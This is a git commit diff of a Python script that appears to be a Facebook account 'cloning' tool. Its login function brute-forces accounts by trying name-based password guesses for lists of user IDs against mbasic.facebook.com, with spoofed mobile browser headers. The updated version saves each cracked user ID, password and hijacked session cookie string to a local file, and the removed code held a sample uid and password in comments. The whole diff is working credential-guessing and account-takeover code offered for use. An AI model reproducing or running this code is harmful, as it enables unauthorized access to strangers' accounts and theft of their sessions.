9cee67d7247ea4b6c5ea346f48ff8dd3d2bf45d9
Mr.Saifii <90976999+Mr-Saifii@users.noreply.github.com>
2023-09-04 14:19:37 +0500

    Update Mr.Saifii.py

--- Mr.Saifii.py
+++ Mr.Saifii.py
@@ -40,69 +40,75 @@ def menu():
     print('cloning end use python filecloner.py relogin')
     print(47*'-')
     exit()
-def check(uid,f,l):
-    global loop,cpu,oku
+def basic(uid, f, l):
+    global loop, cpu, oku
     sys.stdout.write('{}  [ {}/{} ] OK:{}\r'.format(C, str(loop), str(len(idx)), str(len(oku))))
     ses = requests.Session()
-    url = "free.facebook.com"
+    url = "mbasic.facebook.com"
+
     for pw in p_:
         try:
-            pw = pw.replace('first',f).replace('last',l).replace('First',f.capitalize()).replace('Last',l.capitalize())
-            #uid = ("100075519436264")
-            #pw = ("khan1122")
-            pw = pw.lower()
-            p = ses.get("https://{}/login/device-based/password/?uid={}&flow=login_no_pin&refsrc=deprecated&_rdr".format(url,uid),headers={
-                'Host':url,
-                'Connection':'keep-alive',
-                'Cache-Control'	:'max-age=0',
-		    	'sec-ch-ua'	:'" Not A;Brand";v="99", "Chromium";v="101"',
-		    	'sec-ch-ua-mobile':'?1',
-	    		'sec-ch-ua-platform':'"Android"',
-		    	'Upgrade-Insecure-Requests':'1',
-		    	'User-Agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
-		    	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-		    	'Sec-Fetch-Site':'same-origin',
-		    	'Sec-Fetch-Mode':'navigate',
-		    	'Sec-Fetch-User':'?1',
-		    	'Sec-Fetch-Dest':'document',
-		    	'Referer':f'https://{url}/login/device-based/',
-		    	'Accept-Encoding':'gzip, deflate',
-		    	'Accept-Language':'en-us'}).text
-            b=parser(p,"html.parser")
-            _po_ = b.find("form",method="post").get("action")
-            data = {_.get('name'):_.get('value') for _ in b.find('form',{'method':'post'}).findAll('input',{'name':['lsd','jazoest']})}
-            data.update(
-                {'uid':uid,'next':f'https://{url}/login/save-device/','flow':'login_no_pin','encpass':'#PWD_BROWSER:0:{}:{}'.format(random.randint(1111111111,9999999999),pw),'submit':'Log in'})
-            x = ses.post("https://{}{}".format(url,_po_),data=data,headers = {
-		        'Host':url,
-		        'Connection':'keep-alive',
-		        'Content-Length':'142',
-		        'Cache-Control':'max-age=0',
-                'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"',
-                'sec-ch-ua-mobile':'?1',
-                'sec-ch-ua-platform':'"Android"',
-                'Upgrade-Insecure-Requests':'1',
-                'Origin':url,
-                'Content-Type':'application/x-www-form-urlencoded',
-                'User-Agent':"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
-                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                'Sec-Fetch-Site':'same-origin',
-                'Sec-Fetch-Mode':'navigate',
-                'Sec-Fetch-User':'?1',
-                'Sec-Fetch-Dest':'document',
-                'Referer':"https://{}/login/device-based/password/?uid={}&flow=login_no_pin&refsrc=deprecated&_rdr".format(url,uid),
-                'Accept-Encoding':'gzip, deflate, br',
-                'Accept-Language':'en-us'},allow_redirects=False)
-            if 'c_user' in (ses.cookies.get_dict()):
-                print("\r {} [Mr.Saifii-OK] {} {} {} {}".format(G,uid,teer,pw,C))
+            pw = pw.replace('first', f).replace('last', l).replace('First', f.capitalize()).replace('Last',
+                                                                                                    l.capitalize())
+
+            login_url = "https://{}/login/device-based/password/?uid={}&flow=login_no_pin&refsrc=deprecated&_rdr".format(
+                url, uid)
+            headers = {
+                'Host': url,
+                'Connection': 'keep-alive',
+                'Cache-Control': 'max-age=0',
+                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Java"',
+                'Upgrade-Insecure-Requests': '1',
+                'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-User': '?1',
+                'Sec-Fetch-Dest': 'document',
+                'Referer': f'https://{url}/login/device-based/',
+                'Accept-Encoding': 'gzip, deflate',
+                'Accept-Language': 'en-us'
+            }
+
+            response = ses.get(login_url, headers=headers).text
+            soup = BeautifulSoup(response, "html.parser")
+            form_action = soup.find("form", method="post").get("action")
+            form_data = {_.get('name'): _.get('value') for _ in
+                         soup.find('form', {'method': 'post'}).findAll('input', {'name': ['lsd', 'jazoest']})}
+
+            form_data.update({
+                'uid': uid,
+                'next': f'https://{url}/login/save-device/',
+                'flow': 'login_no_pin',
+                'encpass': '#PWD_BROWSER:0:{}:{}'.format(random.randint(1111111111, 9999999999), pw),
+                'submit': 'Log in'
+            })
+
+            post_url = "https://{}{}".format(url, form_action)
+            headers['Referer'] = login_url
+            headers['Content-Type'] = 'application/x-www-form-urlencoded'
+            response = ses.post(post_url, data=form_data, headers=headers, allow_redirects=False)
+
+            if "c_user" in ses.cookies.get_dict():
+                print("\r {} [Mr-saifii-ok] {} {}".format(G, uid, C))
+                try:
+                    coki = ';'.join(["%s=%s" % (k, v) for k, v in ses.cookies.get_dict().items()])
+                except:
+                    coki = 'no'
                 oku.append(uid)
-                break
-            elif 'checkpoint' in (ses.cookies.get_dict()):
-                print("\r {} [Mr.Saifii-CP] {} {} {} {}".format(R,uid,teer,pw,C))
+                url_str = str(uid)
+                idz = url_str + teer + pw + teer + coki + '\n'
+                open('ids_original_pass.txt', 'a').write(idz)
+
+            elif "checkpoint" in ses.cookies.get_dict():
                 break
             else:
                 continue
-        except(CError):
+        except Exception as e:
             time.sleep(10)
-    loop+=1
+            continue
+    loop += 1
+
 menu()
